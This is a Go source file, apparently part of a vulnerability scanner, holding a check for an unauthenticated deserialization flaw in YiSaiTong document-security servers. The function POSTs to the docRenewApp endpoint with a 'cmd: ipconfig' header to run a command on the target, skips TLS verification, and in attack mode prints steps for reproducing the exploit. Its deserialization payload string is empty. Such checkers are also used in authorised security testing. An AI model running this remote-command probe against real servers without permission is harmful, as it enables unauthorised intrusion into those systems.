package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func YiSaiTong_UnauthorizedDeserialization(url string, Attack bool) error {
	payload := ``
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}
	//
	url1 := fmt.Sprintf("%s/CDGServer3/docRenewApp?command=GETSYSTEMINFO", url)

	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "text/xml")
	request.Header.Add("cmd", "ipconfig")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))
	
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "Windows IP") {
		fmt.Println("[*]YiSaiTong_UnauthorizedDeserialization : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/CDGServer3/docRenewApp?command=GETSYSTEMINFO，传入请求头`cmd: ipconfig`并传入请求体``\n")
		}
	}
	defer response.Body.Close()

	return nil
}
